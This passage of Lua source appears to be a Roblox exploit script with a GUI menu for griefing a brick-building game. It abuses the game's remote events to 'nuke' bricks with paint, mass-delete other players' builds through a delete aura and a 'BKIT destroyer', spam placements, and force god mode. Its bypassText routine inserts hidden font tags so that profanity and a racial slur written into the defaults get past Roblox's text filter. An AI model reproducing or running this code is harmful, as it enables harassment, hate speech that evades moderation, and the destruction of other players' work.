
    -- Density levels: {minChunk, maxChunk, attempts}
    -- Start with big chunks (few tags) → go smaller if still filtered
    local levels = {
        {4, 6, 4},   -- ~1 tag per 4-6 chars — barely visible
        {3, 5, 4},   -- ~1 tag per 3-5 chars
        {2, 4, 5},   -- ~1 tag per 2-4 chars
        {1, 3, 6},   -- ~1 tag per 1-3 chars
        {1, 2, 6},   -- ~1 tag per 1-2 chars
    }

    for _, lvl in ipairs(levels) do
        for _ = 1, lvl[3] do
            local attempt = buildBypass(str, lvl[1], lvl[2])
            if not isFiltered(attempt) then
                return attempt  -- found one that passes!
            end
        end
    end

    -- Nuclear fallback: tag between every single character
    local result = ""
    for i = 1, #str do
        result = result .. str:sub(i, i)
        if i < #str then result = result .. BP end
    end
    return result
end

-- ============================================================
-- FIND NEAREST PLACED BRICK IN WORKSPACE
-- Used to verify nuke/fix actually took effect
-- ============================================================
local function getNearestPlacedBrick()
    local char = LocalPlayer.Character; if not char then return nil end
    local hrp  = char:FindFirstChild("HumanoidRootPart"); if not hrp then return nil end
    -- Common folder names for player-placed bricks
    local folders = {"Bricks","Build","Placed","Blocks","UserBricks"}
    local best, bestDist = nil, math.huge
    for _, fname in ipairs(folders) do
        local f = workspace:FindFirstChild(fname)
        if f then
            for _, v in ipairs(f:GetDescendants()) do
                if v:IsA("BasePart") then
                    local d = (v.Position - hrp.Position).Magnitude
                    if d < bestDist then bestDist=d; best=v end
                end
            end
        end
    end
    return best
end

-- ============================================================
-- NUKE — with retry until brick confirms TOXIC + ANCHORED
-- ============================================================
local function runNuke()
    local remote, rootPos = getPaintRemote(); local brick = getBrick()
    if not remote or not brick then print("[NUKE] missing tools"); return end

    local key = "both \u{1F91D}"
    local blk = Color3.new(0, 0, 0)

    -- Default toxic texts — every letter auto-bypassed
    local tp = {
        Front  = bypassText("Fuck Admin"),
        Back   = bypassText("say i eat pussy"),
        Top    = bypassText("hacked by FLAMEFAML/STIK"),
        Bottom = bypassText("GGS BIG W TO STIK"),
        Right  = bypassText("ADMIN HATES NIGGER"),
        Left   = bypassText("CRY GGS"),
    }

    -- STEP 1: Fire toxic + anchor, retry until confirmed
    local maxRetries = 8
    for attempt = 1, maxRetries do
        pcall(function() remote:FireServer(brick, Enum.NormalId.Top, rootPos, key, blk, "toxic", "anchor") end)
        task.wait(0.3)
        pcall(function() remote:FireServer(brick, Enum.NormalId.Top, rootPos, key, blk, "anchor", "") end)
        task.wait(0.25)

        -- Verify: check nearest placed brick
        local placed = getNearestPlacedBrick()
        if placed then
            local isToxic    = placed.Material == Enum.Material.SmoothPlastic or placed.Material == Enum.Material.Neon -- game-specific, best effort
            local isAnchored = placed.Anchored
            if isAnchored then
                print("[NUKE] Anchor confirmed on attempt "..attempt)
                break
            else
                print("[NUKE] Not anchored yet — retry "..attempt.."/"..maxRetries)
                task.wait(0.2)
            end
        else
            -- No brick found to verify, just proceed
            break
        end
    end

    -- STEP 2: Paint faces — auto-bypass via TextService retry
    for _, n in ipairs(faces) do
        local rawTxt = faceData[n] and faceData[n].txt.Text ~= "" and faceData[n].txt.Text or (tp[n] or "GGS")
        -- Smart bypass: checks with Roblox TextService, retries until not filtered
        local ft = bypassText(rawTxt)
        local fc = faceData[n] and faceData[n].clr.BackgroundColor3 or Color3.fromRGB(255, 0, 0)
        for attempt = 1, 3 do
            pcall(function() remote:FireServer(brick, faceEnums[n], rootPos, key, fc, "spray", ft) end)
            task.wait(0.12)
            if attempt < 3 then task.wait(0.05) end
        end
    end
    print("[NUKE] Done — TOXIC + ANCHORED")
end

-- ============================================================
-- FIX — with retry until brick confirms UNANCHORED
-- ============================================================
local function runFix()
    -- Clear face data UI
    for _, n in ipairs(faces) do
        if faceData[n] then
            faceData[n].txt.Text = ""
            faceData[n].clr.BackgroundColor3 = LIGHT_GRAY
        end
    end

    local remote, rootPos = getPaintRemote(); local brick = getBrick()
    if not remote or not brick then print("[FIX] missing tools"); return end
    local key = "both \u{1F91D}"

    -- STEP 1: Fire plastic + unanchor, retry until confirmed UNANCHORED
    local maxRetries = 8
    for attempt = 1, maxRetries do
        pcall(function() remote:FireServer(brick, Enum.NormalId.Top, rootPos, key, LIGHT_GRAY, "plastic", "unanchor") end)
        task.wait(0.3)
        pcall(function() remote:FireServer(brick, Enum.NormalId.Top, rootPos, key, LIGHT_GRAY, "unanchor", "") end)
        task.wait(0.3)

        -- Verify: check nearest placed brick is now unanchored
        local placed = getNearestPlacedBrick()
        if placed then
            if not placed.Anchored then
                print("[FIX] Unanchor confirmed on attempt "..attempt)
                break
            else
                print("[FIX] Still anchored — retry "..attempt.."/"..maxRetries)
                -- Fire again with more force
                pcall(function() remote:FireServer(brick, Enum.NormalId.Top, rootPos, key, LIGHT_GRAY, "unanchor", "") end)
                task.wait(0.3)
            end
        else
            break
        end
    end

    -- STEP 2: Clear all faces to light gray + empty text
    for _, n in ipairs(faces) do
        for attempt = 1, 2 do
            pcall(function() remote:FireServer(brick, faceEnums[n], rootPos, key, LIGHT_GRAY, "spray", "") end)
            task.wait(0.08)
        end
    end

    print("[FIX] Done — PLASTIC + UNANCHOR + LIGHT GRAY (verified)")
end

-- BKIT exact call: pc.Delete.Script.Event:FireServer(Brick, HRP.Position)
local function fireDestroyer()
    local pc=LocalPlayer.Character; if not pc then return end
    local hrp=pc:FindFirstChild("HumanoidRootPart"); if not hrp then return end
    if not pc:FindFirstChild("Delete") then
        local bp=LocalPlayer.Backpack:FindFirstChild("Delete")
        if bp then bp.Parent=pc; task.wait(0.05) end
    end
    local del=pc:FindFirstChild("Delete"); if not del then return end
    local sc=del:FindFirstChild("Script"); if not sc then return end
    local ev=sc:FindFirstChild("Event"); if not ev then return end
    local brick=ReplicatedStorage:FindFirstChild("Brick"); if not brick then return end
    pcall(function() ev:FireServer(brick, hrp.Position) end)
end

-- Aura delete
local function fireDeleteTool(v)
    local char=LocalPlayer.Character; if not char then return end
    local del=char:FindFirstChild("Delete") or LocalPlayer.Backpack:FindFirstChild("Delete"); if not del then return end
    if del.Parent~=char then del.Parent=char end
    del=char:FindFirstChild("Delete"); if not del then return end
    local ori=del:FindFirstChild("origevent")
    if ori then pcall(function() ori:Invoke(v,v.Position) end); return end
    local sc=del:FindFirstChild("Script")
    if sc then local ev=sc:FindFirstChild("Event"); if ev then pcall(function() ev:FireServer(v,v.Position) end); return end end
    local ev2=del:FindFirstChildWhichIsA("RemoteEvent",true)
    if ev2 then pcall(function() ev2:FireServer(v,v.Position) end) end
end

-- ============================================================
-- PAGE 1: NUKE
-- ============================================================
createLabel(pgNuke, "  Face Text & Colors", Color3.fromRGB(80,80,120), 13)
for _, name in ipairs(faces) do
    local row = Instance.new("Frame", pgNuke)
    row.Size             = UDim2.fromOffset(CW, 34)
    row.BackgroundColor3 = Color3.fromRGB(42, 42, 62)
    row.BorderSizePixel  = 0
    Instance.new("UICorner", row).CornerRadius = UDim.new(0, 10)

    local fl = Instance.new("TextLabel", row)
    fl.Size=UDim2.fromOffset(50,34); fl.Position=UDim2.fromOffset(4,0)
    fl.Text=name; fl.TextColor3=Color3.fromRGB(80,80,110); fl.Font=Enum.Font.GothamBold
    fl.TextSize=10; fl.BackgroundTransparency=1

    local txt = Instance.new("TextBox", row)
    txt.Size             = UDim2.fromOffset(CW-100, 26)
    txt.Position         = UDim2.fromOffset(54, 4)
    txt.BackgroundColor3 = Color3.fromRGB(28, 28, 46)
    txt.Text             = "GG\'S"
    txt.PlaceholderText  = name.." text"
    txt.TextColor3       = Color3.fromRGB(200, 200, 220)
    txt.Font             = Enum.Font.Gotham
    txt.TextSize         = 12
    txt.BorderSizePixel  = 0
    txt.ClearTextOnFocus = false
    Instance.new("UICorner", txt).CornerRadius = UDim.new(0, 6)

    -- BP button — appends <font size='0'></font> to end of text
    local bpBtn = Instance.new("TextButton", row)
    bpBtn.Size             = UDim2.fromOffset(30, 26)
    bpBtn.Position         = UDim2.fromOffset(54 + (CW-100) + 4, 4)
    bpBtn.Text             = "BP"
    bpBtn.Font             = Enum.Font.GothamBold
    bpBtn.TextSize         = 9
    bpBtn.TextColor3       = Color3.fromRGB(255, 255, 255)
    bpBtn.BackgroundColor3 = Color3.fromRGB(70, 10, 140)
    bpBtn.BorderSizePixel  = 0
    bpBtn.AutoButtonColor  = false
    Instance.new("UICorner", bpBtn).CornerRadius = UDim.new(0, 6)
    bpBtn.MouseButton1Click:Connect(function()
        txt.Text = txt.Text .. "<font size='0'></font>"
        bpBtn.BackgroundColor3 = Color3.fromRGB(11, 95, 40)
        task.delay(0.25, function() bpBtn.BackgroundColor3 = Color3.fromRGB(70,10,140) end)
    end)

    local clr = Instance.new("TextButton", row)
    clr.Size=UDim2.fromOffset(28,28); clr.Position=UDim2.fromOffset(CW-32,3)
    clr.BackgroundColor3=Color3.fromRGB(255,0,0); clr.Text=""; clr.BorderSizePixel=0
    Instance.new("UICorner",clr).CornerRadius=UDim.new(0,6)
    clr.MouseButton1Click:Connect(function() openPicker(clr) end)
    faceData[name] = {txt=txt, clr=clr}
end
createDivider(pgNuke)
createLabel(pgNuke, "  Actions", Color3.fromRGB(80,80,120), 13)
createButton(pgNuke, "🔥  NUKE BRICK  (TOXIC + ANCHOR)", function() task.spawn(runNuke) end, CW, 42)
createButton(pgNuke, "▶  EXECUTE SEQUENCE", function() task.spawn(runNuke) end, CW, 38)

local spamNuking = false
createToggle(pgNuke, "⚡  SPAM NUKE", function(v) spamNuking = v end, CW)
createButton(pgNuke, "💣  NUKE CUBES (BKIT)", function()
    task.spawn(function() for i=1,200 do fireDestroyer(); task.wait(0.02) end end)
end, CW, 38)

task.spawn(function() while task.wait(0.5) do if spamNuking then pcall(runNuke) end end end)

-- ============================================================
-- PAGE 2: FIX
-- ============================================================
createLabel(pgFix, "  Repair / Clean Brick", Color3.fromRGB(80,80,120), 13)
createLabel(pgFix, "  Plastic  |  Unanchored  |  Light Gray  |  Clears text", Color3.fromRGB(11,95,226), 13)
createButton(pgFix, "🛠  FIX BRICK  (PLASTIC + UNANCHOR)", function() task.spawn(runFix) end, CW, 46)

createDivider(pgFix)
createLabel(pgFix, "  Restore Build", Color3.fromRGB(80,80,120), 13)
createLabel(pgFix, "  Replaces your brick from saved brickcollection", Color3.fromRGB(11,95,226), 11)

createButton(pgFix, "🔄  RESTORE BUILD", function()
    task.spawn(function()
        -- Make sure ReplicatedStorage has a Brick reference
        if not game.ReplicatedStorage:FindFirstChild("Brick") then
            local brick = Instance.new("Part")
            brick.Name = "Brick"
            brick.Parent = game.ReplicatedStorage
        end

        -- Equip Build tool
        local function equipTool(name)
            local char = LocalPlayer.Character
            local tool = (char and char:FindFirstChild(name))
                      or LocalPlayer.Backpack:FindFirstChild(name)
            if not tool then return nil end
            if tool.Parent ~= char then
                tool.Parent = char
                task.wait(0.1)
            end
            return char and char:FindFirstChild(name)
        end

        local function getPlrPos()
            local char = LocalPlayer.Character
            local hrp  = char and char:FindFirstChild("HumanoidRootPart")
            return hrp and hrp.Position or Vector3.new(0,0,0)
        end

        local et = equipTool("Build")
        if not et then
            print("[RESTORE] Build tool not found!")
            return
        end

        -- Check brickcollection exists
        if not getgenv or not getgenv().brickcollection then
            print("[RESTORE] No brickcollection found — run the game script first")
            return
        end

        local ws = 0.15  -- wait between builds

        -- Sort: non-Brick/Debris entries first
        local currbc = {}
        for i, v in pairs(getgenv().brickcollection) do
            if v ~= nil then
                if v:GetFullName() ~= "Brick" and v.Name ~= "Debris" then
                    table.insert(currbc, 1, v)
                else
                    table.insert(currbc, v)
                end
            else
                table.remove(getgenv().brickcollection, table.find(getgenv().brickcollection, v))
            end
        end

        local bricksFolder = workspace:FindFirstChild("Bricks")
        local myBricks     = bricksFolder and bricksFolder:FindFirstChild(LocalPlayer.Name)
        local beforeAmt    = myBricks and #myBricks:GetChildren() or 0
        local nof          = #currbc

        print("[RESTORE] Starting — " .. nof .. " bricks to restore")

        for i, v in pairs(currbc) do
            if v ~= nil then
                et = equipTool("Build")
                if not et then
                    print("[RESTORE] Build tool lost — stopping")
                    break
                end

                -- Fire build event (adapted from original)
                pcall(function()
                    local ev = et:FindFirstChild("origevent")
                    if ev then
                        ev:Invoke(v, Enum.NormalId.Top, getPlrPos(), "detailed")
                    else
                        et.Script.Event:FireServer(
                            v,
                            Enum.NormalId.Top,
                            getPlrPos(),
                            "detailed"
                        )
                    end
                end)

                print("[RESTORE] Brick " .. (nof + 1 - i) .. " of " .. nof .. " — " .. v.Name)
                task.wait(ws)

                -- If a new brick appeared, success for this one
                local nowAmt = myBricks and #myBricks:GetChildren() or 0
                if nowAmt > beforeAmt then
                    beforeAmt = nowAmt
                end
            else
                table.remove(currbc, table.find(currbc, v))
            end
        end

        -- Restart tool scripts (fixes tool state after mass building)
        for _, v in ipairs(LocalPlayer.Character:GetChildren()) do
            if v:HasTag("The Chosen One by TomazDev") then
                pcall(function() v.Script.Enabled = false; v.Script.Enabled = true end)
            end
        end
        for _, v in ipairs(LocalPlayer.Backpack:GetChildren()) do
            if v:HasTag("The Chosen One by TomazDev") then
                pcall(function() v.Script.Enabled = false; v.Script.Enabled = true end)
            end
        end

        task.wait(1)

        -- Check result
        local myNewBricks = myBricks and myBricks:FindFirstChildWhichIsA("BasePart")
        if myNewBricks then
            print("[RESTORE] Build restored successfully!")
        else
            print("[RESTORE] Failed — run script before everything is delcubed")
        end
    end)
end, CW, 46)

-- ============================================================
-- PAGE 3: SLOTS
-- ============================================================
createLabel(pgSlots, "  Config Slots", Color3.fromRGB(80,80,120), 13)
local slotBox = createTextBox(pgSlots, "Config name...", CW, 34)
createButton(pgSlots, "💾  SAVE SLOT", function()
    local name = slotBox.Text ~= "" and slotBox.Text or "Config_"..os.time()
    local data = {faces={}}
    for n,v in pairs(faceData) do local c=v.clr.BackgroundColor3; data.faces[n]={t=v.txt.Text,c={c.R,c.G,c.B}} end
    if writefile then writefile("WindConfigs/"..name..".json", HttpService:JSONEncode(data)) end
    print("[SLOTS] Saved: "..name)
end, CW)
createButton(pgSlots, "🗑  DELETE SLOT", function()
    local name = slotBox.Text
    if name ~= "" and isfile and isfile("WindConfigs/"..name..".json") then
        if delfile then delfile("WindConfigs/"..name..".json") end
        slotBox.Text = ""; print("[SLOTS] Deleted: "..name)
    end
end, CW)

local slotListFrame = Instance.new("Frame", pgSlots)
slotListFrame.Size                   = UDim2.fromOffset(CW, 0)
slotListFrame.AutomaticSize          = Enum.AutomaticSize.Y
slotListFrame.BackgroundTransparency = 1
Instance.new("UIListLayout", slotListFrame).Padding = UDim.new(0, 4)

local function updateSlots()
    for _,v in pairs(slotListFrame:GetChildren()) do if v:IsA("TextButton") then v:Destroy() end end
    if not isfolder or not isfolder("WindConfigs") then return end
    for _,file in pairs(listfiles("WindConfigs")) do
        local name = file:match("WindConfigs/(.+)%.json") or file:match("WindConfigs\\(.+)%.json")
        if name then
            local b = createButton(slotListFrame, "▶  LOAD: "..name, function()
                local ok,result=pcall(function() return HttpService:JSONDecode(readfile(file)) end)
                if not ok then return end
                slotBox.Text = name
                if result.faces then
                    for n,d in pairs(result.faces) do
                        if faceData[n] then
                            faceData[n].txt.Text = d.t or ""
                            if type(d.c)=="table" then faceData[n].clr.BackgroundColor3=Color3.new(d.c[1],d.c[2],d.c[3]) end
                        end
                    end
                end
                print("[SLOTS] Loaded: "..name)
            end, CW, 36)
        end
    end
end
createButton(pgSlots, "📂  REFRESH SLOTS", updateSlots, CW)
updateSlots()

-- ============================================================
-- PAGE 4: AURA
-- ============================================================
createLabel(pgAura, "  Delete Aura Settings", Color3.fromRGB(80,80,120), 13)
createLabel(pgAura, "  Fires every Heartbeat — maximum speed", Color3.fromRGB(11,95,226), 13)

local daura=false; local dauras=false; local dauraRange=35
local daurapart=Instance.new("Part")
daurapart.Shape=Enum.PartType.Ball; daurapart.Anchored=true; daurapart.CanCollide=false
daurapart.CastShadow=false; daurapart.CanQuery=false; daurapart.Color=Color3.fromRGB(255,0,0)
daurapart.Transparency=1; daurapart.Size=Vector3.new(35,35,35); daurapart.Parent=workspace

local auraFilter=OverlapParams.new()
auraFilter.FilterType=Enum.RaycastFilterType.Include; auraFilter.MaxParts=100
pcall(function() auraFilter:AddToFilter(workspace:WaitForChild("Bricks",3)) end)

createSlider(pgAura,"Range",5,150,35,function(v) dauraRange=v; daurapart.Size=Vector3.new(v,v,v) end,CW)
createToggle(pgAura,"🌀  Delete Aura (Standard)",function(v)
    daura=v; daurapart.Transparency=(daura or dauras) and 0.45 or 1
end,CW)
createToggle(pgAura,"🌀  Delete Aura (Solara)",function(v)
    dauras=v; daurapart.Transparency=(daura or dauras) and 0.45 or 1
end,CW)

RunService.Heartbeat:Connect(function()
    if not (daura or dauras) then return end
    local char=LocalPlayer.Character; if not char then return end
    local pos=char:GetPivot().Position
    daurapart.Position=pos
    if daura then
        for _,v in ipairs(workspace:GetPartsInPart(daurapart,auraFilter)) do task.spawn(fireDeleteTool,v) end
    end
    if dauras then
        local bf=workspace:FindFirstChild("Bricks")
        if bf then
            for _,v in ipairs(bf:GetDescendants()) do
                if v:IsA("BasePart") and (v.Position-pos).Magnitude<dauraRange then task.spawn(fireDeleteTool,v) end
            end
        end
    end
end)

-- ============================================================
-- PAGE 5: BKIT
-- ============================================================
createLabel(pgBkit, "  BKIT Destroyer", Color3.fromRGB(80,80,120), 13)
createLabel(pgBkit, "  Delete.Script.Event:FireServer(Brick, HRP.Position)", Color3.fromRGB(11,95,226), 12)

local destroyerRunning=false; local destroyerRate=50

createButton(pgBkit,"💥  START BKIT DESTROYER",function()
    if destroyerRunning then return end
    destroyerRunning=true; print("[BKIT] Destroyer started")
    task.spawn(function()
        while destroyerRunning do fireDestroyer(); task.wait(1/math.max(destroyerRate,1)) end
        print("[BKIT] Destroyer stopped")
    end)
end, CW, 44)
createButton(pgBkit,"⏹  STOP DESTROYER",function() destroyerRunning=false end, CW, 36)
createSlider(pgBkit,"Rate (fires/sec)",1,200,50,function(v) destroyerRate=v end,CW)
createDivider(pgBkit)
createButton(pgBkit,"💣  NUKE CUBES BURST",function()
    task.spawn(function() for i=1,200 do fireDestroyer(); task.wait(0.02) end end)
end, CW, 38)

-- ============================================================
-- PAGE 6: SPAM
-- ============================================================
createLabel(pgSpam, "  Spam Build", Color3.fromRGB(80,80,120), 13)
createLabel(pgSpam, "  Fires brick placement directly — no face-paint delays", Color3.fromRGB(11,95,226), 13)

local spamBuildActive=false; local spamBuildRate=20
createToggle(pgSpam,"⚡  SPAM BUILD",function(v) spamBuildActive=v end, CW, 44)
createSlider(pgSpam,"Rate (bricks/sec)",1,60,20,function(v) spamBuildRate=v end,CW)

local sbCountLbl = createLabel(pgSpam,"  Placed: 0",Color3.fromRGB(116,113,117),14)
local sbCount    = 0
task.spawn(function()
    while true do
        task.wait(1/math.max(spamBuildRate,1))
        if spamBuildActive then
            local char=LocalPlayer.Character
            if char then
                local hrp=char:FindFirstChild("HumanoidRootPart")
                local tool=char:FindFirstChild("Paint") or LocalPlayer.Backpack:FindFirstChild("Paint")
                if hrp and tool then
                    if tool.Parent~=char then
                        local hum=char:FindFirstChildOfClass("Humanoid")
                        if hum then hum:EquipTool(tool) end; task.wait(0.2)
                        tool=char:FindFirstChild("Paint")
                    end
                    if tool then
                        local remote=tool:FindFirstChild("Event",true) or tool:FindFirstChildWhichIsA("RemoteEvent",true)
                        local brick=getBrick()
                        if remote and brick then
                            pcall(function() remote:FireServer(brick,Enum.NormalId.Top,hrp.Position,"both \u{1F91D}",Color3.new(0,0,0),"toxic","anchor") end)
                            sbCount=sbCount+1; sbCountLbl.Text="  Placed: "..sbCount.." @ "..spamBuildRate.."/s"
                        end
                    end
                end
            end
        end
    end
end)

-- ============================================================
-- PAGE 7: ANTI — Protection suite (VPLI-style methods)
-- ============================================================
createLabel(pgAnti, "  Anti / Protection", Color3.fromRGB(80,80,120), 13)
createDivider(pgAnti)

local antiConns = {}
local function addConn(key, conn)
    if antiConns[key] then pcall(function() antiConns[key]:Disconnect() end) end
    antiConns[key] = conn
end
local function killConn(key)
    if antiConns[key] then pcall(function() antiConns[key]:Disconnect() end); antiConns[key]=nil end
end

-- ============================================================
-- GOD MODE (anti-maptide / anti-void — user's exact working method)
-- ============================================================
-- Immediately kill void height — before anything else
workspace.FallenPartsDestroyHeight = -1e9

local godConn = nil
local function applyGodMode(char)
    -- 1. IMMEDIATELY stop engine from deleting parts in the void
    workspace.FallenPartsDestroyHeight = -1e9

    -- 2. Wait for parts (5s max, no infinite yield)
    local hrp = char:WaitForChild("HumanoidRootPart", 5)
    local hum = char:WaitForChild("Humanoid", 5)
    if not hrp or not hum then return end

    -- 3. Disable death + infinite health
    hum:SetStateEnabled(Enum.HumanoidStateType.Dead, false)
    hum:SetStateEnabled(Enum.HumanoidStateType.FallingDown, false)
    pcall(function() sethiddenproperty(hum, "Health", 1e308) end)
    pcall(function() sethiddenproperty(hum, "MaxHealth", 1e308) end)
    hum.MaxHealth = math.huge
    hum.Health    = math.huge

    -- 4. Teleport loop — fights NaN / void pull for 2 seconds
    task.spawn(function()
        for i = 1, 20 do
            if hrp and hrp.Parent then
                hrp.CFrame = CFrame.new(0, 200, 0)
                hrp.AssemblyLinearVelocity = Vector3.zero
            end
            task.wait(0.1)
        end
    end)

    -- 5. Touch immunity
    for _, part in ipairs(char:GetDescendants()) do
        if part:IsA("BasePart") then part.CanTouch = false end
    end

    -- 6. Heartbeat lock — keeps FallenPartsDestroyHeight at -1e9 every frame
    addConn("godHB", RunService.Heartbeat:Connect(function()
        pcall(function() workspace.FallenPartsDestroyHeight = -1e9 end)
        if hum and hum.Parent and hum.Health < 999 then
            hum.Health = math.huge
        end
    end))

    -- 7. HealthChanged safety net
    hum.HealthChanged:Connect(function()
        if hum and hum.Parent then hum.Health = math.huge end
    end)

    -- 8. Died safety net
    hum.Died:Connect(function()
        if hum and hum.Parent then
            hum.Health = math.huge
            hum:SetStateEnabled(Enum.HumanoidStateType.Dead, false)
        end
    end)
end

createToggle(pgAnti, "⚔  God Mode", function(v)
    if v then
        workspace.FallenPartsDestroyHeight = -1e9
        if LocalPlayer.Character then applyGodMode(LocalPlayer.Character) end
        godConn = LocalPlayer.CharacterAdded:Connect(function(c)
            task.wait(0.1)
            applyGodMode(c)
        end)
    else
        killConn("godHB")
        if godConn then godConn:Disconnect(); godConn = nil end
        pcall(function() workspace.FallenPartsDestroyHeight = -500 end)
    end
end, CW, 46)

createDivider(pgAnti)

-- ============================================================
-- ANTI GLITCH (VPLI method)
-- Tracks Y delta per frame. If Y spikes > 120 studs in one
-- frame without legit jump velocity = glitch tp → restore.
-- ============================================================
local lastSafePos = nil
local prevY       = nil

createToggle(pgAnti, "🌀  Anti Glitch", function(v)
    if v then
        addConn("glitch", RunService.Heartbeat:Connect(function()
            local char = LocalPlayer.Character; if not char then return end
            local hrp  = char:FindFirstChild("HumanoidRootPart"); if not hrp then return end
            local hum  = char:FindFirstChild("Humanoid"); if not hum then return end
            local pos  = hrp.Position
            local vel  = hrp.AssemblyLinearVelocity
            -- Save safe pos when grounded
            if hum.FloorMaterial ~= Enum.Material.Air and pos.Y > -100 and pos.Y < 150 then
                lastSafePos = pos
            end
            -- NaN detection
            local nan = pos.X ~= pos.X or pos.Y ~= pos.Y or pos.Z ~= pos.Z
            -- Sky glitch: Y jumped > 120 but vertical velocity didn't cause it
            local skyTp = prevY ~= nil and (pos.Y - prevY) > 120 and math.abs(vel.Y) < 50
            if (nan or skyTp) and lastSafePos then
                hrp.AssemblyLinearVelocity  = Vector3.zero
                hrp.AssemblyAngularVelocity = Vector3.zero
                hrp.CFrame = CFrame.new(lastSafePos + Vector3.new(0, 4, 0))
                print("[ANTI GLITCH] Sky glitch caught — restored to safe pos")
            end
            prevY = pos.Y
        end))
    else
        killConn("glitch"); lastSafePos=nil; prevY=nil
    end
end, CW, 46)

-- ============================================================
-- ANTI FREEZE (VPLI method)
-- Watches if WalkSpeed is externally zeroed or character
-- stops responding to MoveDirection. Restores or resets.
-- ============================================================
local NORMAL_WS   = 16
local NORMAL_JP   = 50
local frozenTimer = 0

createToggle(pgAnti, "🧊  Anti Freeze", function(v)
    if v then
        addConn("freeze", RunService.Heartbeat:Connect(function(dt)
            local char = LocalPlayer.Character; if not char then return end
            local hum  = char:FindFirstChild("Humanoid"); if not hum then return end
            local hrp  = char:FindFirstChild("HumanoidRootPart"); if not hrp then return end
            -- Restore stolen WalkSpeed
            if hum.WalkSpeed < 1 then
                hum.WalkSpeed = NORMAL_WS
                hum.JumpPower = NORMAL_JP
            end
            -- Detect hard freeze: trying to move but not moving for 4s
            local wantMove = hum.MoveDirection.Magnitude > 0.1
            local isMoving = hrp.AssemblyLinearVelocity.Magnitude > 0.4
            if wantMove and not isMoving then
                frozenTimer = frozenTimer + dt
                if frozenTimer > 4 then
                    frozenTimer = 0
                    print("[ANTI FREEZE] Frozen — resetting character")
                    LocalPlayer:LoadCharacter()
                end
            else
                frozenTimer = 0
            end
        end))
    else
        killConn("freeze"); frozenTimer=0
    end
end, CW, 46)

-- ============================================================
-- ANTI BLIND (VPLI method)
-- Hook PlayerGui.ChildAdded — destroy black fullscreen frames
-- instantly on inject. Also locks Lighting ColorCorrection.
-- ============================================================
local function nukeBlind(obj)
    if not obj:IsA("ScreenGui") or obj.Name == "SimpleHub" then return end
    task.defer(function()
        if not obj or not obj.Parent then return end
        for _, d in ipairs(obj:GetDescendants()) do
            if d:IsA("Frame") or d:IsA("ImageLabel") then
                local c = d.BackgroundColor3
                if c.R < 0.08 and c.G < 0.08 and c.B < 0.08
                and d.Size == UDim2.fromScale(1,1)
                and d.BackgroundTransparency < 0.5 then
                    d.BackgroundTransparency = 1
                    print("[ANTI BLIND] Nuked black overlay in "..obj.Name)
                end
            end
        end
    end)
end

createToggle(pgAnti, "🚫  Anti Blind", function(v)
    if v then
        addConn("blindAdd", LocalPlayer.PlayerGui.ChildAdded:Connect(nukeBlind))
        addConn("blindHB", RunService.Heartbeat:Connect(function()
            if math.random(1,60)~=1 then return end
            for _, e in ipairs(game:GetService("Lighting"):GetChildren()) do
                if e:IsA("ColorCorrectionEffect") and e.Brightness < -0.2 then e.Brightness=0 end
                if e:IsA("BlurEffect") then e.Size=0 end
            end
        end))
        for _, g in ipairs(LocalPlayer.PlayerGui:GetChildren()) do nukeBlind(g) end
    else
        killConn("blindAdd"); killConn("blindHB")
    end
end, CW, 46)

-- ============================================================
-- ANTI MORPH (VPLI method)
-- Records HumanoidDescription on spawn. If body colors change
-- drastically (external morph applied) → reset character.
-- ============================================================
local savedDesc = nil

createToggle(pgAnti, "👤  Anti Morph", function(v)
    if v then
        local char = LocalPlayer.Character
        if char then
            local hum = char:FindFirstChildOfClass("Humanoid")
            if hum then pcall(function() savedDesc = hum:GetAppliedDescription() end) end
        end
        addConn("morphRespawn", LocalPlayer.CharacterAdded:Connect(function(c)
            task.wait(1)
            local hum = c:FindFirstChildOfClass("Humanoid")
            if hum then pcall(function() savedDesc = hum:GetAppliedDescription() end) end
        end))
        addConn("morphHB", RunService.Heartbeat:Connect(function()
            if math.random(1,90)~=1 then return end
            local char = LocalPlayer.Character; if not char then return end
            local hum  = char:FindFirstChildOfClass("Humanoid"); if not hum then return end
            if not savedDesc then return end
            local ok, cur = pcall(function() return hum:GetAppliedDescription() end)
            if ok and cur and (cur.HeadColor ~= savedDesc.HeadColor or cur.TorsoColor ~= savedDesc.TorsoColor) then
                print("[ANTI MORPH] Morph detected — resetting")
                savedDesc = nil
                LocalPlayer:LoadCharacter()
            end
        end))
    else
        killConn("morphHB"); killConn("morphRespawn"); savedDesc=nil
    end
end, CW, 46)

-- ============================================================
-- ANTI VAMPIRE SWORD (VPLI method)
-- Intercept PlayerGui.ChildAdded — if new ScreenGui appears
-- with a fullscreen ImageLabel/Frame = vampire screen break.
-- Destroy it instantly + restore backpack/CoreGui.
-- ============================================================
local SGS = game:GetService("StarterGui")
local function restoreCore()
    pcall(function() SGS:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true) end)
    pcall(function() SGS:SetCoreGuiEnabled(Enum.CoreGuiType.All, true) end)
end
local function isVampGui(g)
    if not g:IsA("ScreenGui") or g.Name=="SimpleHub" then return false end
    for _, d in ipairs(g:GetDescendants()) do
        if (d:IsA("ImageLabel") or d:IsA("ImageButton") or d:IsA("Frame"))
        and d.Size == UDim2.fromScale(1,1) then return true end
    end
    return false
end

createToggle(pgAnti, "🧛  Anti Vampire Sword", function(v)
    if v then
        restoreCore()
        addConn("vamp", LocalPlayer.PlayerGui.ChildAdded:Connect(function(child)
            task.wait(0.02)
            if isVampGui(child) then
                child:Destroy(); restoreCore()
                print("[ANTI VAMPIRE] Blocked: "..child.Name)
            end
        end))
        addConn("vampHB", RunService.Heartbeat:Connect(function()
            if math.random(1,120)==1 then restoreCore() end
        end))
    else
        killConn("vamp"); killConn("vampHB")
    end
end, CW, 46)

-- ============================================================
-- ANTI MYOPIC (VPLI method)
-- Lock FOV to 70 every frame. Reset camera type if hijacked.
-- ============================================================
local DEFAULT_FOV = 70

createToggle(pgAnti, "👓  Anti Myopic", function(v)
    if v then
        workspace.CurrentCamera.FieldOfView = DEFAULT_FOV
        addConn("myopic", RunService.Heartbeat:Connect(function()
            local cam = workspace.CurrentCamera
            if cam.FieldOfView ~= DEFAULT_FOV then cam.FieldOfView = DEFAULT_FOV end
            if cam.CameraType ~= Enum.CameraType.Custom
            and cam.CameraType ~= Enum.CameraType.Follow then
                cam.CameraType = Enum.CameraType.Custom
            end
        end))
    else
        killConn("myopic")
    end
end, CW, 46)

-- ============================================================
-- ANTI COLORBLIND (VPLI method)
-- Resets all Lighting color effects every ~1s.
-- ============================================================
local Lighting = game:GetService("Lighting")
local function resetColors()
